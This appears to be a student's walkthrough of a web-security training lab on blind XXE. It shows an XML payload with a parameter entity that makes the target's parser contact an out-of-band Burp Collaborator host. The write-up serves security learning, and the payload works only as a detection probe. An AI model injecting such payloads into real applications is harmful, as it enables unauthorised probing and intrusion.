# Lab: Blind XXE with out-of-band interaction via XML parameter entities

 This lab has a "Check stock" feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.

To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator. 

**Note**

*To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.*

# Step 1 Walk the application

I want to find where the application is using XML, and find a location I can test for XXE on the /product/stock page

![image](https://user-images.githubusercontent.com/83407557/210183855-7a8f4f85-6bf5-48b1-9638-0dd1dfc53b74.png)

# Step 2 create a payload with a parameter entity

Grabbing attack-server URL:

![image](https://user-images.githubusercontent.com/83407557/210183886-64015264-cff2-4c46-8e26-34c743ac005d.png)

```
s0tiemqwne4py9a6p9it4d0uclic62ur.oastify.com
```

Creating the payload:

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://s0tiemqwne4py9a6p9it4d0uclic62ur.oastify.com"> %xxe; ]>
```

# Step 3 perform XXE injection

![image](https://user-images.githubusercontent.com/83407557/210183929-5158ac3d-0ed8-46c4-81ec-4d983c4f2103.png)

# Step 4 Poll collaborator

I see that a DNS lookup was made from the target application:

![image](https://user-images.githubusercontent.com/83407557/210183951-9ef58f44-7906-4bb8-87a7-9b0d840580bd.png)

which solves the lab:

![image](https://user-images.githubusercontent.com/83407557/210183954-16ce8d36-ae9b-47ed-b8f8-76eda9525ed3.png)


